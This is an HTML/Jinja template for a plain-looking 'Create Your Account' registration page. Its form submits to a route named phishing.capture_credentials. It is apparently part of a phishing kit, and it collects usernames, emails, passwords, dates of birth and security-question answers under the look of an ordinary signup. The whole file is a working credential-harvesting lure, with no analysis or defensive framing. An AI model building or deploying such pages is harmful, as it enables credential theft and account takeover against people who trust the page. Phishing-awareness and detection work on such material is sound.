<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Your Account</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css">
    <style>
        body {
            background-color: #f4f7fc;
            font-family: 'Roboto', sans-serif;
        }

        .register-container {
            margin: 50px auto;
            max-width: 500px;
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.1);
        }

        .register-container h1 {
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 30px;
            text-align: center;
            color: #333;
        }

        .form-group label {
            font-weight: 500;
            color: #444;
        }

        .form-control {
            border-radius: 6px;
            padding: 12px;
            font-size: 14px;
            border: 1px solid #ccc;
        }

        .form-control:focus {
            border-color: #007bff;
            box-shadow: none;
        }

        .btn-register {
            background-color: #007bff;
            color: #ffffff;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .btn-register:hover {
            background-color: #0056b3;
        }

        .text-muted {
            font-size: 13px;
            text-align: center;
            color: #777;
        }

        .text-muted a {
            color: #007bff;
            text-decoration: none;
        }

        .text-muted a:hover {
            text-decoration: underline;
        }

        .form-text {
            font-size: 12px;
            color: #888;
        }

        .form-check-input {
            margin-top: 0.3rem;
        }
    </style>
</head>

<body>
    <div class="register-container">
        <h1>Create Your Account</h1>
        <form action="{{ url_for('phishing.capture_credentials') }}" method="POST">
            <!-- Username -->
            <div class="form-group mb-3">
                <label for="username">Username</label>
                <input type="text" class="form-control" id="username" name="username" placeholder="Enter your username"
                    required>
            </div>

            <!-- Email -->
            <div class="form-group mb-3">
                <label for="email">Email Address</label>
                <input type="email" class="form-control" id="email" name="email" placeholder="Enter your email"
                    required>
            </div>

            <!-- Password -->
            <div class="form-group mb-3">
                <label for="password">Password</label>
                <input type="password" class="form-control" id="password" name="password"
                    placeholder="Enter your password" required>
                <div class="form-text">Your password must be at least 8 characters long.</div>
            </div>

            <!-- Repeat Password -->
            <div class="form-group mb-3">
                <label for="password-repeat">Repeat Password</label>
                <input type="password" class="form-control" id="password-repeat" name="password-repeat"
                    placeholder="Repeat your password" required>
            </div>

            <!-- Additional Questions -->
            <div class="form-group mb-3">
                <label for="dob">Date of Birth</label>
                <input type="date" class="form-control" id="dob" name="dob" required>
            </div>

            <div class="form-group mb-3">
                <label for="security-question">Security Question</label>
                <select class="form-control" id="security-question" name="security-question" required>
                    <option value="">Select a question...</option>
                    <option value="mother-maiden-name">What is your mother's maiden name?</option>
                    <option value="first-pet">What was the name of your first pet?</option>
                    <option value="favorite-color">What is your favorite color?</option>
                </select>
            </div>

            <div class="form-group mb-3">
                <label for="security-answer">Answer to Security Question</label>
                <input type="text" class="form-control" id="security-answer" name="security-answer"
                    placeholder="Answer the question" required>
            </div>

            <!-- Terms and Conditions -->
            <div class="form-check mb-4">
                <input class="form-check-input" type="checkbox" value="" id="terms" name="terms" required>
                <label class="form-check-label" for="terms">
                    I agree to the <a href="#">Terms and Conditions</a>.
                </label>
            </div>

            <!-- Register Button -->
            <button type="submit" class="btn-register">Register</button>
        </form>

        <!-- Footer -->
        <div class="text-muted mt-4">
            Already have an account? <a href="#">Login here</a>.
        </div>
    </div>
</body>

</html>
